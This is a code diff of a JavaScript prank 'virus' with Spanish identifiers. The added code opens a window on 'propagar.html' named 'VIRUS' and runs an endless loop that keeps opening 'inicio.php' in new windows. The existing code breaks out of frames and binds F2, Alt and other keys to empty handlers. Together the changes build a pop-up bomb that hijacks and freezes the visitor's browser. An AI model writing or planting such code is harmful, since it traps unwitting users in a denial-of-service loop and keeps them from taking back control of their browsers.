@@ -4,12 +4,13 @@ function virus(){
 
 	bloqueo();
 	maximizar();
+	cargaPaginas();
 }
 
 function bloqueo(){
 if(top.location != self.location)
   top.location = self.location;
-shortcut.add("F1",function() {
+shortcut.add("s",function() {
 });
 shortcut.add("F2",function() {
 });
@@ -43,6 +44,15 @@ shortcut.add("Alt",function() {
 
 function maximizar(){
 
-	alert("Funciona");
+	var w= Math.floor(Math.random() * 100); 
+	window.open("propagar.html", "VIRUS", "width=100" , "height=100");
+	
+}
+
+function cargaPaginas(){
+   for(var i = 1; i >= 1;i++){
+     window.open("inicio.php");
+     
+ }
 
 }
